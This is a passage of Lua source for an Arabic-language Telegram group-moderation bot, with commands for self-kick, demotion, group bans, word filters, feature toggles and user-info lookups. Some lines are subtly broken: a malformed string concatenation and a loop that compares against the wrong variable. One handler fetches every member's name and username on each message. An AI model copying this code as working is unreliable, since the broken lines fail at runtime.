if text == 'اطردني' and not tahadevstorm:get(DEVSTOR.."lock:kickme"..msg.chat_id_)   then if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") tahadevstorm:del(DEVSTOR..'kick:'..msg.chat_id_..':'..msg.sender_user_id_, true) else if storm1(msg.chat_id_,msg.sender_user_id_) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '❌*¦* لا استطيع طرد { المنشئين او المميزين عام او المطورين او المدراء او المميزين او الادمنيه }\n', 1, 'md') tahadevstorm:del(DEVSTOR..'kick:'..msg.chat_id_..':'..msg.sender_user_id_, true) else  local hash = 'kick:'..msg.chat_id_..':'..msg.sender_user_id_ tahadevstorm:set(DEVSTOR..hash, "waite") storm_sendMsg(msg.chat_id_, msg.id_, 1, '🚸*¦* لاتمام العمليه اتبع مايلي\n✔*¦* ارسل {`نعم`} لاستمرار العمليه \n*📬¦* ارسل {`لا`} لالغاء العمليه\n', 1, 'md') end end end if text then local hash = 'kick:'..msg.chat_id_..':'..msg.sender_user_id_ if text:match("^نعم$") and tahadevstorm:get(DEVSTOR..hash) == "waite" then tahadevstorm:set(DEVSTOR..hash, "نعم") elseif text:match("^لا$") and tahadevstorm:get(DEVSTOR..hash) == "waite" then storm_sendMsg(msg.chat_id_, msg.id_, 1, '📛*¦* شكرا لك لن يتم طردك من هنا 🔅\n', 1, 'md') tahadevstorm:del(DEVSTOR..hash, true) end end local hash = 'kick:'..msg.chat_id_..':'..msg.sender_user_id_ if tahadevstorm:get(DEVSTOR..hash) then if tahadevstorm:get(DEVSTOR..hash) == "نعم" then if storm1(msg.chat_id_,msg.sender_user_id_) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '❌ ❯ لا استطيع طرد { الادمنيه او المدراء او المميزين }\n', 1, 'md') else  kick(msg,msg.chat_id_,msg.sender_user_id_)  storm_sendMsg(msg.chat_id_, msg.id_, 1, '📮 ❯ لقد تم طردك من المجموعه ✔\n', 1, 'md') end tahadevstorm:del(DEVSTOR..'kick:'..msg.chat_id_..':'..msg.sender_user_id_, true) end end
if text == 'نزلني' and not tahadevstorm:get(DEVSTOR.."lock:demrtpa"..msg.chat_id_)   then local hash = 'demrtpa:'..msg.chat_id_..':'..msg.sender_user_id_ tahadevstorm:set(DEVSTOR..hash, "waite") if storm2(msg.chat_id_,msg.sender_user_id_) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '❌*¦* لا استطيع تنزيل { المنشئين او المميزين عام او المطورين }\n', 1, 'md') tahadevstorm:del(DEVSTOR..'demrtpa:'..msg.chat_id_..':'..msg.sender_user_id_, true)  else  if not is_memar(msg)  then  tahadevstorm:del(DEVSTOR..'demrtpa:'..msg.chat_id_..':'..msg.sender_user_id_, true) storm_sendMsg(msg.chat_id_, msg.id_, 1, '📬*¦* انت مجرد عضو هنا 😹🍂\n', 1, 'md') tahadevstorm:del(DEVSTOR..'demrtpa:'..msg.chat_id_..':'..msg.sender_user_id_, true)  else storm_sendMsg(msg.chat_id_, msg.id_, 1, '🚸*¦* اهلا عزيزي '..get_rtba(msg)..'💠\n✔*¦* ارسل {`نعم`} ليتم تنزيلك\n❌*¦* ارسل {`لا`} لالغاء العمليه\n', 1, 'md') end end end if text then local hash = 'demrtpa:'..msg.chat_id_..':'..msg.sender_user_id_ if text:match("^نعم$") and tahadevstorm:get(DEVSTOR..hash) == "waite" then tahadevstorm:set(DEVSTOR..hash, "نعم") elseif text:match("^لا$") and tahadevstorm:get(DEVSTOR..hash) == "waite" then tahadevstorm:del(DEVSTOR..'demrtpa:'..msg.chat_id_..':'..msg.sender_user_id_, true) if is_monsh(msg) then t = 'المدراء'  elseif is_mod(msg) then t = 'الادمنيه'  elseif is_vipgroup(msg) then t = 'المميزين'  end storm_sendMsg(msg.chat_id_, msg.id_, 1, '📬 ❯ حسنآ لن يتم تنزيلك من '..t..'🍃\n', 1, 'md') end end local hash = 'demrtpa:'..msg.chat_id_..':'..msg.sender_user_id_ if tahadevstorm:get(DEVSTOR..hash) then if tahadevstorm:get(DEVSTOR..hash) == "نعم" then tahadevstorm:srem(DEVSTOR..'modergroup'..msg.chat_id_,msg.sender_user_id_)  tahadevstorm:srem(DEVSTOR..'mods:'..msg.chat_id_,msg.sender_user_id_) tahadevstorm:srem(DEVSTOR..'vip:group'..msg.chat_id_,msg.sender_user_id_) storm_sendMsg(msg.chat_id_, msg.id_, 1, '📮 ❯ لقد تم تنزيلك الان انت عضو 🍀\n', 1, 'md') tahadevstorm:del(DEVSTOR..'demrtpa:'..msg.chat_id_..':'..msg.sender_user_id_, true) end end
if text == "تفعيل الاضافه" and is_owner(msg) then if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else  tahadevstorm:set(DEVSTOR..'add:mepr:'..msg.chat_id_,true) storm_sendMsg(msg.chat_id_, msg.id_, 1,"📮❯ تم تفعيل الاضافه اجباري", 1, 'md') end end
if text == "تعطيل الاضافه" and is_owner(msg) then tahadevstorm:del(DEVSTOR..'add:mepr:'..msg.chat_id_) tahadevstorm:del(DEVSTOR..'meaddwy:'..msg.chat_id_) tahadevstorm:del(DEVSTOR..'meaddtaha:'..msg.chat_id_) local taha = tahadevstorm:keys("addedtaha:*") for i=1,#taha do tahadevstorm:del(DEVSTOR..taha[i]) end storm_sendMsg(msg.chat_id_, msg.id_, 1,"📮❯ تم تعطيل الاضافه اجباري", 1, 'md') end
if text and text:match("^ضع عدد الاضافه (%d+)$") and is_owner(msg) then local numadded = string.match(text, "^ضع عدد الاضافه (%d+)$") tahadevstorm:set(DEVSTOR..'setadd:'..msg.chat_id_,numadded) storm_sendMsg(msg.chat_id_, msg.id_,  1, "📬❯ تم وضع عدد الاضافه *{ "..numadded..' }*', 1, 'md') end 
if text and text:match('^حظر (-%d+)') and is_devtaha(msg) then  local ch = text:match('حظر (-%d+)')  tahadevstorm:sadd(DEVSTOR..'ban:group', ch)  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*💠¦* المجموعه تم حظرها بنجاح ✔ \n*📡¦ الايدي* ◗`'..ch..'`◖\n', 1, 'md')  end
if text and text:match('^الغاء الحظر (-%d+)') and is_devtaha(msg) then  local ch = text:match('الغاء الحظر (-%d+)') tahadevstorm:srem(DEVSTOR..'ban:group', ch)  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*💠¦* المجموعه تم الغاء حظرها ✔ \n*📡¦ الايدي* ◗`'..ch..'`◖\n', 1, 'md') end
if text and text:match('(.*)') then  taha = tahadevstorm:smembers(DEVSTOR..'ban:group')  for k,v in pairs(taha) do storm_sendMsg(v, msg.id_, 1, '*🚨¦* المجموعه تم حظرها من قبل المطور لا يمكنك اضافتي 🍃\n', 1, 'md') rem_group(v)  rem_lockal(v) tahadevstorm:del(DEVSTOR.."test:group"..v)   tahadevstorm:del(DEVSTOR..'moder'..v) tahadevstorm:del(DEVSTOR..'modergroup'..v) tahadevstorm:del(DEVSTOR..'mods:'..v) changeChatMemberStatus(v, bot_id, "Left") end end
if text ==('المجموعات المحظوره') and is_sudo(msg) then  local list = tahadevstorm:smembers(DEVSTOR..'ban:group')  local t = '*🚨¦ ايدي المجموعات التي تم حظرها*\n\n*ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n'  for k,v in pairs(list) do   t = t..'*◖'..k.."◗* `"..v.."`\n*{"..title_name(v)..'}*\n*ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n'   file = io.open("storm_groupsban", "w") file:write([[ ]]..isnothtml(t)..[[ ]]) file:close() end  t = t..''  if #list >= 25 then  sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './storm_groupsban','📛¦ عدد المجموعات اصبح اكثر من 25\n🚸¦ تم ارسال ملف توجد فيه المجموعات',dl_cb, nil) else storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md')  end end    if text and text:match('(.*)') then  function m(arg, data) for k, v in pairs(data.members_) do get_username(v.user_id_) get_name(v.user_id_) end end tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 146200000000}, m, nil) end end
if tahadevstorm:get(DEVSTOR.."add:bot:group"..msg.chat_id_)  then
if text==('اعدادات المجموعه') and is_mod(msg) then  function gpinfo(arg,data) if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else local nummsg = tonumber(tahadevstorm:get(DEVSTOR..'groupmsg:'..msg.chat_id_..':')) local nummsgg = tahadevstorm:get(DEVSTOR..'groupmsg:'..msg.chat_id_..':') local taha = '\n👮*¦* عدد الادمنيه *◗ '..data.administrator_count_..' ◖*\n🚸*¦* عدد المطرودين *◗ '..data.kicked_count_..' ◖*\n👲*¦* عدد الاعضاء *◗ '..data.member_count_..' ◖*\n📋*¦* عدد الرسائل *◗ '..(nummsgg)..' ◖*\n📊*¦* التفاعل *◗ '..(formsggroup(nummsg))..' ◖*\n📛*¦* الايدي *◗'..(msg.chat_id_)..'◖*\n*📃¦* الاسم ◗`'..title_name(msg.chat_id_)..'`◖'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, 'md') end end getChannelFull(msg.chat_id_, gpinfo, nil) end
if text and text:match("^مشاهده منشور$") then tahadevstorm:set(DEVSTOR..'viewchannel'..msg.sender_user_id_,true) storm_sendMsg(msg.chat_id_, msg.id_, 1, '♼*¦* حسننا ارسل التوجيه من القناة سارسل عدد المشاهدات', 1, 'md') end 
if text and text:match("^ضع رد تواصل$") and is_devtaha(msg) then   tahadevstorm:setex(DEVSTOR.."sudo:pv" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  storm_sendMsg(msg.chat_id_, msg.id_, 1,'📬*¦* ارسل لي النص الذي تريده ', 1, 'md') end 
if text and text:match("^ضع كليشه المطور$") and is_devtaha(msg) then tahadevstorm:setex(DEVSTOR.."sudo:dev" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  storm_sendMsg(msg.chat_id_, msg.id_, 1,'📬*¦* ارسل لي النص الذي تريده ', 1, 'md') end 
if text and text:match("^ضع كليشه ستارت$") and is_devtaha(msg) then tahadevstorm:setex(DEVSTOR.."start:msgofstart" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  storm_sendMsg(msg.chat_id_, msg.id_, 1,'📬*¦* ارسل لي النص الذي تريده ', 1, 'md') end 
if text and text:match('^كشف (-%d+)') and is_sudo(msg) then local ch = text:match('كشف (-%d+)') function gpinfo(arg,data)  local Linkgp = tahadevstorm:get(DEVSTOR.."link:group"..ch) if not Linkgp then   Linkgp = "لا يوجد"  else Linkgp = '[اضغط هنا للدخول]('..tahadevstorm:get(DEVSTOR.."link:group"..ch)..')'  end  local nummsg = tonumber(tahadevstorm:get(DEVSTOR..'groupmsg:'..ch..':')) local nummsgg = tahadevstorm:get(DEVSTOR..'groupmsg:'..ch..':') local whogp = '\n*👮¦ عدد الادمنيه ◗ '..data.administrator_count_..' ◖*\n*📛¦ عدد المطرودين ◗ '..data.kicked_count_..' ◖*\n*👨¦ عدد الاعضاء ◗ '..data.member_count_..' ◖*\n*📬¦* الايدي ◗`'..(ch)..'`◖\n*📤¦* الرابط ◗ '..Linkgp..' ◖\n*🎲¦* عدد الرسائل الكروب ◗ '..nummsgg..' ◖\n*📊¦* التفاعل ◗ '..formsggroup(nummsg)..' ◖\n*📃¦* الاسم ◗`'..title_name(ch)..'`◖' storm_sendMsg(msg.chat_id_, msg.id_, 1,whogp, 1, 'md') end getChannelFull(ch, gpinfo, nil) end
if text== ('ضع اسم') and is_owner(msg) then local function name_reply(extra, result, success) changeChatTitle(result.chat_id_, result.content_.text_) storm_sendMsg(msg.chat_id_,msg.id_, 1, "*📬¦* تم وضع الاسم", 1, 'md')  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),name_reply)   end
if text== ('ضع رابط') and msg.reply_to_message_id_ ~= 0 and is_mod(msg) then local function name_reply(extra, result, success) tahadevstorm:set(DEVSTOR.."link:group"..msg.chat_id_,result.content_.text_) storm_sendMsg(msg.chat_id_,msg.id_, 1, "*📬¦* تم وضع رابط المجموعه", 1, 'md')  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),name_reply) end
if text== ('منع') and is_mod(msg) then local function name_reply(extra, result, success)  tahadevstorm:sadd(DEVSTOR..'filters:'..result.chat_id_,result.content_.text_)  storm_sendMsg(msg.chat_id_,msg.id_, 1, "*📋¦* الكلمه ◗`"..result.content_.text_.."`◖\n📮*¦* تم اضافتها الى قائمه المنع \n", 1, 'md')  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),name_reply) end
if text== ('الغاء منع') and is_mod(msg) then local function name_reply(extra, result, success) tahadevstorm:srem(DEVSTOR..'filters:'..result.chat_id_,result.content_.text_) storm_sendMsg(msg.chat_id_,msg.id_, 1, "📋*¦* الكلمه ◗`"..result.content_.text_.."`◖\n*📮¦* تم حذفها من قائمه المنع \n", 1, 'md')  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),name_reply) end
if text == 'تفعيل الردود بالرد' and is_monsh(msg) then   taha = '◗*📛¦*تم تفعيل الردود بالرد  ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:del(DEVSTOR..'lock:rep:rd'..msg.chat_id_)  end
if text == 'تعطيل الردود بالرد' and is_monsh(msg) then  taha = '◗*📛¦*تم تعطيل الردود بالرد  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:set(DEVSTOR..'lock:rep:rd'..msg.chat_id_,true)   end
if text == 'تفعيل الردود' and is_monsh(msg) then   taha = '◗*📛¦*تم تفعيل الردود بالرد  ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:del(DEVSTOR..'lock:rep'..msg.chat_id_)  end
if text == 'تعطيل الردود' and is_monsh(msg) then  taha = '◗*📛¦*تم تعطيل الردود بالرد  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:set(DEVSTOR..'lock:rep'..msg.chat_id_,true)   end
if text == 'تفعيل الايدي' and is_monsh(msg) then   taha = '◗*📛¦*تم تفعيل الايدي  ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:del(DEVSTOR..'lock:id'..msg.chat_id_) tahadevstorm:set(DEVSTOR..'lock:idphoto'..msg.chat_id_,true) end
if text == 'تعطيل الايدي' and is_monsh(msg) then  taha = '◗*📛¦*تم تعطيل الايدي  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:set(DEVSTOR..'lock:id'..msg.chat_id_,true) tahadevstorm:del(DEVSTOR..'lock:idphoto'..msg.chat_id_)  end
if text == 'تفعيل ردود البوت' and is_devtaha(msg) then    taha = '◗*📛¦*تم تفعيل ردود البوت  ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:del(DEVSTOR..'lock:reoly:bot'..bot_id) end
if text == 'تعطيل ردود البوت' and is_devtaha(msg) then    taha = '◗*📛¦*تم تعطيل ردود البوت  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:set(DEVSTOR..'lock:reoly:bot'..bot_id,true) end
if text == 'تفعيل جلب الصوره' and is_monsh(msg) then   taha = '◗*📛¦*تم تفعيل جلب الصور  ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:del(DEVSTOR..'lock:get:photo'..msg.chat_id_) end 
if text == 'تعطيل جلب الصوره' and is_monsh(msg) then   taha = '◗*📛¦*تم تعطيل جلب الصور  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:set(DEVSTOR..'lock:get:photo'..msg.chat_id_,true) end
if text == 'تفعيل امر اطردني' and is_monsh(msg) then   taha = '◗*📛¦*تم تفعيل امر اطردني  ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:del(DEVSTOR..'lock:kickme'..msg.chat_id_) end 
if text == 'تعطيل امر اطردني' and is_monsh(msg) then   taha = '◗*📛¦*تم تعطيل امر اطردني  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:set(DEVSTOR..'lock:kickme'..msg.chat_id_,true) end
if text == 'تفعيل امر نزلني' and is_monsh(msg) then   taha = '◗*📛¦*تم تفعيل امر نزلني  ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:del(DEVSTOR..'lock:demrtpa'..msg.chat_id_) end 
if text == 'تعطيل امر نزلني' and is_monsh(msg) then   taha = '◗*📛¦*تم تعطيل امر نزلني  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:set(DEVSTOR..'lock:demrtpa'..msg.chat_id_,true) end
if text == 'تفعيل ردود المجموعه' and is_monsh(msg) then   taha = '◗*📛¦*تم تفعيل ردود المجموعه  ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") if not tahadevstorm:get(DEVSTOR..'lock:reply'..msg.chat_id_) then tahadevstorm:del(DEVSTOR..'lock:reply'..msg.chat_id_) end end
if text == 'تعطيل ردود المجموعه' and is_monsh(msg) then   taha = '◗*📛¦*تم تعطيل ردود المجموعه  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")   if not tahadevstorm:get(DEVSTOR..'lock:reply'..msg.chat_id_) then   tahadevstorm:set(DEVSTOR..'lock:reply'..msg.chat_id_,true) end   end 
if text == 'تفعيل البوت الخدمي' and is_devtaha(msg) then local  taha = '◗*📛¦*تم تفعيل البوت خدمي  ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:del(DEVSTOR..'lock:bot:free'..bot_id) end 
if text == 'تعطيل البوت الخدمي' and is_devtaha(msg) then taha = '◗*📛¦*تم تعطيل البوت الخدمي  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:set(DEVSTOR..'lock:bot:free'..bot_id,true) end
if text == 'تفعيل التواصل' and is_devtaha(msg) then local  taha = '◗*📛¦*تم تفعيل بوت التواصل  ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:del(DEVSTOR..'lock:botl'..bot_id) end 
if text == 'تعطيل التواصل' and is_devtaha(msg) then taha = '◗*📛¦*تم تعطيل التواصل  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:set(DEVSTOR..'lock:botl'..bot_id,true) end
if text == 'تفعيل الكتابه' and is_devtaha(msg) then local  taha = '◗*📛¦*تم تفعيل الكتابه  ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:del(DEVSTOR..'lock:tepy'..bot_id) end 
if text == 'تعطيل الكتابه' and is_devtaha(msg) then taha = '◗*📛¦*تم تعطيل الكتابه  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:set(DEVSTOR..'lock:tepy'..bot_id,true) end
if text and text:match("^صورتي (%d+)") and not tahadevstorm:get(DEVSTOR.."lock:get:photo"..msg.chat_id_)  then local pro = tonumber(text and text:match("^صورتي (%d+)")) local function myprofile(extra, result, success) if result.total_count_ == 0 then storm_sendMsg(msg.chat_id_, msg.id_,  1, '❌*¦* عذرا انت لا تضع صوره في حسابك', 1, 'md') else if result.total_count_ >= pro then if result.photos_[0] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_, '\n🌁¦ صورتك رقم ◗ '..pro..' ◖\n📋¦ عدد صورك ◗ '..result.total_count_..' ◖\n📊¦ حجم صورتك ◗ '..result.photos_[0].sizes_[1].photo_.size_..' ◖') end else storm_sendMsg(msg.chat_id_, msg.id_,  1, '\n*📛¦* انت لا تمتلك صوره رقم  *{'..pro..'}*\n*🌁¦* عدد صورك هي *{'..result.total_count_..'}*', 1, 'md')   end end end getUserProfilePhotos(msg.sender_user_id_, pro-1, 1000, myprofile) end
if text and text:match('^ايدي$') and msg.reply_to_message_id_ ~= 0  then  function id_reply(extra, result, success)  print(get_name(result.forward_info_.sender_user_id_))  print(get_username(result.forward_info_.sender_user_id_)) sleep(0.4) if result.forward_info_ then  text = '\n🚸❯ معلومات الشخص ❮🚸\n<b>📬¦ ايدي العضو ❯ {</b> <code>'..result.forward_info_.sender_user_id_..'</code> <b>}</b>\n<b>📬¦ معرف العضو ❯ {</b>'..get_username(result.forward_info_.sender_user_id_)..'<b>}</b>\n<b>🚸¦ اسم العضو ❯ {</b> <code>'..get_name(result.forward_info_.sender_user_id_)..'</code> <b>}</b>'  else  text = 'قم بالمحاوله مره ثانيه'  end  storm_sendMsg(msg.chat_id_, msg.id_,  1, text, 1, 'html')  end  getMessage(msg.chat_id_,msg.reply_to_message_id_,id_reply)  end
if text and text:match('^ايدي$') and msg.reply_to_message_id_ ~= 0 and not msg.forward_info_  then   function id_reply(extra, result, success)   if result.forward_info_ then  storm_sendMsg(msg.chat_id_, msg.id_,  1, '', 1, 'html')  else storm_sendMsg(msg.chat_id_, msg.id_,  1, '<b>🎮¦الايدي ❯ {</b> <code>'..(result.sender_user_id_)..'</code> <b>}</b>', 1, 'html')   end end getMessage(msg.chat_id_,msg.reply_to_message_id_,id_reply)   end 
if text == "مطورين البوت" or text == "اريد بوت" or text == "المطور" or text == "مطور" then  local dev = tahadevstorm:get(DEVSTOR.."dev") if dev then storm_sendMsg(msg.chat_id_, msg.id_,1,''..check_markdown(dev)..'',1,'md') else storm_sendMsg(msg.chat_id_, msg.id_,1,'💢*¦* عذرا لم يتم وضع كليشه المطور ',1,'md')  end  end
if text == "حذف كليشه المطور" and is_devtaha(msg) then  tahadevstorm:del(DEVSTOR.."dev") storm_sendMsg( msg.chat_id_, msg.id_, 1, '◗*📛¦*تم حذف كليشه المطور', 1, "md") end 
if text == "جلب رد التواصل" then local pvstart = tahadevstorm:get(DEVSTOR.."pvstart") storm_sendMsg(msg.chat_id_, msg.id_, 1,''..check_markdown(pvstart)..'', 1, 'md') end
if text == "جلب كليشه ستارت" then  local start = tahadevstorm:get(DEVSTOR.."start:msgofstart1")  if start then storm_sendMsg(msg.chat_id_, msg.id_, 1,''..check_markdown(start)..'', 1, 'md') else storm_sendMsg(msg.chat_id_, msg.id_, 1,'*🎭¦ لم يتم وضع كليشه ستارت *\n', 1, 'md') end end
if text == "حذف رد التواصل" and is_devtaha(msg) then  tahadevstorm:del(DEVSTOR.."pvstart") storm_sendMsg( msg.chat_id_, msg.id_, 1, '◗*📛¦*تم حذف رد التوصل', 1, "md") end 
if text == "حذف كليشه ستارت" and is_devtaha(msg) then  tahadevstorm:del(DEVSTOR.."start:msgofstart1") storm_sendMsg( msg.chat_id_, msg.id_, 1, '◗*📛¦*تم حذف كليشه ستارت', 1, "md") end 
if text == 'رتبتي' or text=='مكاني'  then function bot_kick(extra, result, success) username = '@'..(result.username_ or 'ماكو معرف ❌')..'' local msgtaha = 357 local msggstaha = tahadevstorm:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) or 0  local nupmsgg =  tonumber((msggstaha / msgtaha) * 100)   local  sto = 1  for k,v in pairs(tahadevstorm:hkeys("user:messages"..msg.chat_id_..":*")) do if tahadevstorm:get(DEVSTOR.."user:messages"..msg.chat_id_":"..v) > sto then  sto = tahadevstorm:get(DEVSTOR.."user:messages"..msg.chat_id_":"..v) end end local msguser = tonumber(tahadevstorm:get(DEVSTOR..'msg:user:'..msg.chat_id_..':'..msg.sender_user_id_) or 1) local ch =  '@STORMCLI' local msgs = tahadevstorm:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) if is_devtaha(msg) then t = 'مطور اساسي 👨🏻‍💻'  elseif is_sudo(msg) then t = 'مطور 👨‍💻'  elseif is_owner(msg) then t = 'المنشئ 👨🏻‍✈️'  elseif is_monsh(msg) then t = 'المدير 🕵🏻‍♂'     elseif is_mod(msg) then t = 'ادمن الكروب 👮' elseif is_vipgroup(msg) then t = 'مميز 🎅'   elseif is_vipgroups(msg) then t = 'مميز عام 🌟'  elseif is_vipgroup(msg) then t = 'مميز 🎅'   else t = 'مجرد عضو 🙌'   end       local taha = '📛*¦ رتبتـك ◗ '..t..' ◖ *\n🚸*¦ ايديـك◗ '..msg.sender_user_id_..' ◖* \n🚨*¦* معرفك◗[ '..username..' ◖ ]\n📃*¦ رسائلك◗ '..(tahadevstorm:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) or 0)..' ◖*\n📊*¦ تفاعلك◗ '..formsgg(msguser)..'◖* \n👮*¦ اسمك ◗ *`'..result.first_name_..'` ◖'  storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") end getUser(msg.sender_user_id_, bot_kick) end
if text == 'موقعي' or text == 'معلوماتي'  then function bot_kick(extra, result, success) username = '@'..(result.username_ or 'ماكو معرف ❌')..'' local msguser = tonumber(tahadevstorm:get(DEVSTOR..'msg:user:'..msg.chat_id_..':'..msg.sender_user_id_) or 1)  local msgtaha = 357 local msggstaha = tahadevstorm:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) or 0  local nupmsgg =  tonumber((msggstaha / msgtaha) * 100)   local  tah = 1  for k,v in pairs(tahadevstorm:hkeys("user:messages"..msg.chat_id_..":*")) do if tahadevstorm:get(DEVSTOR.."user:messages"..msg.chat_id_":"..v) > taha then  tah = tahadevstorm:get(DEVSTOR.."user:messages"..msg.chat_id_":"..v) end end local ch =  '@STORMCLI' local msgs = tahadevstorm:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) if is_devtaha(msg) then t = 'مطور اساسي 👨🏻‍💻'  elseif is_sudo(msg) then t = 'مطور 👨‍💻'  elseif is_owner(msg) then t = 'المنشئ 👨🏻‍✈️'  elseif is_monsh(msg) then t = 'المدير 🕵🏻‍♂'     elseif is_mod(msg) then t = 'ادمن الكروب 👮' elseif is_vipgroup(msg) then t = 'مميز 🎅'   elseif is_vipgroups(msg) then t = 'مميز عام 🌟'  elseif is_vipgroup(msg) then t = 'مميز 🎅'   else t = 'مجرد عضو 🙌'   end        local taha = '\n💠*¦  ايديك ◗ '..msg.sender_user_id_..' ◖*\n🚨*¦* معرفك  ◗[ '..username..' ]◖\n👮*¦ موقعك ◗ *'..t..' ◖\n📃*¦ رسائلك ◗ '..(tahadevstorm:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) or 0)..' ◖*\n📊*¦ تفاعلك ◗ '..formsgg(msguser)..' ◖*\n👮*¦ اسمك ◗* `'..result.first_name_..'` ◖' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") end getUser(msg.sender_user_id_, bot_kick) end
if text == 'عدد الاضافه' or text == 'شكد اضيف' or text == 'شكد العدد' then local whatnumadded = (tahadevstorm:get(DEVSTOR..'setadd:'..msg.chat_id_) or '0') storm_sendMsg(msg.chat_id_, msg.id_, 1,"📇*¦* عدد الاضافات المطلوبه\n🚸*¦* *"..whatnumadded.."* اشخاص \n", 1, 'md') end
if text == "مسح رسايلي"  then  local taha = '\n*📊¦* عدد رسائلك ( *'..tahadevstorm:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_)..'* ) رساله\n◗*📛¦*تم مسح رسائلك سيتم العد من جديد'  storm_sendMsg(msg.chat_id_, msg.id_, 1,taha, 1, 'md')  tahadevstorm:del(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) tahadevstorm:del(DEVSTOR..'groupmsg:'..msg.chat_id_..':')   end
if text == "رسايلي" or text == "رسائلي" or text == "msg" then local taha = 'عدد رسائلك ( *'..tahadevstorm:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_)..'* ) رساله' storm_sendMsg(msg.chat_id_, msg.id_, 1,taha, 1, 'md') end end
if text == "معرفي"  then  function getmepar(extra,result,success)  if result.username_ then zo = '@'..result.username_ else zo = ' ماعدك معرف 📯 ' end local taha = 'معرفك ([ '..zo..' ]) ✨' storm_sendMsg(msg.chat_id_, msg.id_, 1,taha, 1, 'md') end getUser(msg.sender_user_id_, getmepar) end
if text == "اسمي"  then function setname(extra,result,success) snm = result.first_name_   local taha = '` '..snm..' `' storm_sendMsg(msg.chat_id_, msg.id_, 1,taha, 1, 'md') end getUser(msg.sender_user_id_,setname) end end if chat_type == 'super' and  tahadevstorm:get(DEVSTOR.."add:bot:group"..msg.chat_id_)  then
